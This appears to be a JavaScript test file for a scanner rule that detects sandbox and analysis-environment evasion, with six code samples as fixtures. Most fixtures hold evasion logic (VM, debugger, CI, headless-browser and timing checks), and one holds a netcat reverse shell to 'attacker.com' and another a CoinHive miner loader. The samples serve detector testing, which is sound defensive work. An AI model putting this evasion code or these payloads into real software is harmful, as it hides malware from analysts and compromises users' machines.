const rule14_env_evasion = require("../services/rule14_env_evasion");

// Test 1: Normal development code
const test1 = {
    files: [
        {
            path: "index.js",
            content: `
                // Normal environment-based configuration
                const isProduction = process.env.NODE_ENV === 'production';
                const port = process.env.PORT || 3000;
                
                if (isProduction) {
                    console.log('Running in production mode');
                } else {
                    console.log('Running in development mode');
                }
                
                // Normal file check
                const fs = require('fs');
                if (fs.existsSync('./config.json')) {
                    const config = require('./config.json');
                }
            `
        }
    ]
};

// Test 2: Sandbox detection with early return
const test2 = {
    files: [
        {
            path: "malware.js",
            content: `
                const fs = require('fs');
                const os = require('os');
                
                // Check for VM files
                function isVirtualMachine() {
                    if (fs.existsSync('/proc/self/status')) {
                        const content = fs.readFileSync('/proc/self/status', 'utf8');
                        return content.includes('VxID') || content.includes('sched_debug');
                    }
                    return false;
                }
                
                // Check for debugger
                function isBeingDebugged() {
                    return process.env.NODE_DEBUG !== undefined || 
                           process.execArgv.includes('--inspect');
                }
                
                // Check for sandbox by looking at CPU count (sandboxes often have few)
                function isSandbox() {
                    return os.cpus().length < 2 || os.totalmem() < 1073741824; // Less than 2 CPUs or 1GB RAM
                }
                
                // Main evasion logic
                function initializeMalware() {
                    // Early return if in analysis environment
                    if (process.env.CI === 'true' || 
                        process.env.JEST_WORKER_ID !== undefined ||
                        isVirtualMachine() ||
                        isBeingDebugged() ||
                        isSandbox()) {
                        console.log('Running in safe mode...');
                        return; // Don't execute malicious code
                    }
                    
                    // Execute malicious payload only in real environments
                    deployBackdoor();
                    stealCredentials();
                    startCryptominer();
                }
                
                function deployBackdoor() {
                    // Malicious backdoor code
                    require('child_process').exec('nc -e /bin/bash attacker.com 4444');
                }
            `
        }
    ]
};

// Test 3: Browser-based sandbox detection
const test3 = {
    files: [
        {
            path: "browser-evasion.js",
            content: `
                // Client-side sandbox detection
                function isHeadlessBrowser() {
                    // Check for headless Chrome
                    if (navigator.webdriver === true) {
                        return true;
                    }
                    
                    // Check for missing plugins (headless often has none)
                    if (navigator.plugins.length === 0) {
                        return true;
                    }
                    
                    // Check window size (headless often has 0x0)
                    if (window.outerWidth === 0 && window.outerHeight === 0) {
                        return true;
                    }
                    
                    // Check user agent for headless
                    if (/HeadlessChrome/.test(navigator.userAgent)) {
                        return true;
                    }
                    
                    return false;
                }
                
                // Behavior switching based on detection
                if (isHeadlessBrowser()) {
                    // Behave normally during analysis
                    console.log('Analytics initialized');
                    sendAnalyticsData();
                } else {
                    // Execute malicious code on real users
                    injectKeylogger();
                    hijackSession();
                    startCryptojacking();
                }
                
                function startCryptojacking() {
                    // Load CoinHive miner
                    const script = document.createElement('script');
                    script.src = 'https://coinhive.com/lib/coinhive.min.js';
                    document.head.appendChild(script);
                }
            `
        }
    ]
};

// Test 4: Network-based environment detection
const test4 = {
    files: [
        {
            path: "network-evasion.js",
            content: `
                const dns = require('dns');
                const https = require('https');
                
                // Check if we're in a sandbox by testing network connectivity
                async function isNetworkSandboxed() {
                    try {
                        // Sandboxes often block or fake network requests
                        const response = await fetch('http://icanhazip.com');
                        const ip = await response.text();
                        
                        // Check if IP belongs to known cloud/sandbox providers
                        const isCloudIP = await dns.reverse(ip);
                        return isCloudIP.some(hostname => 
                            hostname.includes('amazonaws.com') || 
                            hostname.includes('googleusercontent.com') ||
                            hostname.includes('azure.com')
                        );
                    } catch (error) {
                        // Network error might indicate sandbox
                        return true;
                    }
                }
                
                // Check for specific VM hostnames via DNS
                async function isVMEnvironment() {
                    try {
                        const hostnames = await dns.lookupService('8.8.8.8', 80);
                        return hostnames.hostname.includes('vmware') || 
                               hostnames.hostname.includes('virtualbox');
                    } catch (error) {
                        return false;
                    }
                }
                
                // Only execute if not in sandbox
                Promise.all([isNetworkSandboxed(), isVMEnvironment()]).then(([isSandboxed, isVM]) => {
                    if (!isSandboxed && !isVM) {
                        executeMaliciousPayload();
                    }
                });
            `
        }
    ]
};

// Test 5: Process and timing-based detection
const test5 = {
    files: [
        {
            path: "timing-evasion.js",
            content: `
                // Check for debugging via timing analysis
                function isBeingDebuggedByTiming() {
                    const start = Date.now();
                    debugger; // This will cause a pause if debugger is attached
                    const end = Date.now();
                    
                    // If execution was paused for debugging, time difference will be large
                    return (end - start) > 100;
                }
                
                // Check parent process (debuggers often spawn child processes)
                function isChildOfDebugger() {
                    const parentPid = process.ppid;
                    // In real implementation, would check parent process name
                    return parentPid !== 1; // Not init process (common in containers/sandboxes)
                }
                
                // Check uptime (sandboxes often have short uptime)
                function hasShortUptime() {
                    const uptime = require('os').uptime();
                    return uptime < 300; // Less than 5 minutes
                }
                
                // Combine all checks
                if (isBeingDebuggedByTiming() || isChildOfDebugger() || hasShortUptime()) {
                    // Evade by behaving normally
                    console.log('System check passed');
                } else {
                    // Execute malicious code
                    const payload = require('./encrypted-payload');
                    payload.activate();
                }
            `
        }
    ]
};

// Test 6: Suspicious function names
const test6 = {
    files: [
        {
            path: "evasive-module.js",
            content: `
                // Functions with obvious evasion names
                function isSandboxed() {
                    return process.env.VIRTUAL_ENV !== undefined;
                }
                
                const detectVM = () => {
                    // VM detection logic
                    return false;
                };
                
                function avoidDetection() {
                    // Obfuscation and anti-analysis code
                    return "clean";
                }
                
                // Main function that uses these
                function initialize() {
                    if (!isSandboxed() && !detectVM()) {
                        avoidDetection();
                        // Malicious code here
                    }
                }
            `
        }
    ]
};

console.log("Test 1: Normal development code");
console.log(JSON.stringify(rule14_env_evasion(test1), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 2: Sandbox detection with early return");
console.log(JSON.stringify(rule14_env_evasion(test2), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 3: Browser-based sandbox detection");
console.log(JSON.stringify(rule14_env_evasion(test3), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 4: Network-based environment detection");
console.log(JSON.stringify(rule14_env_evasion(test4), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 5: Process and timing-based detection");
console.log(JSON.stringify(rule14_env_evasion(test5), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 6: Suspicious function names");
console.log(JSON.stringify(rule14_env_evasion(test6), null, 2));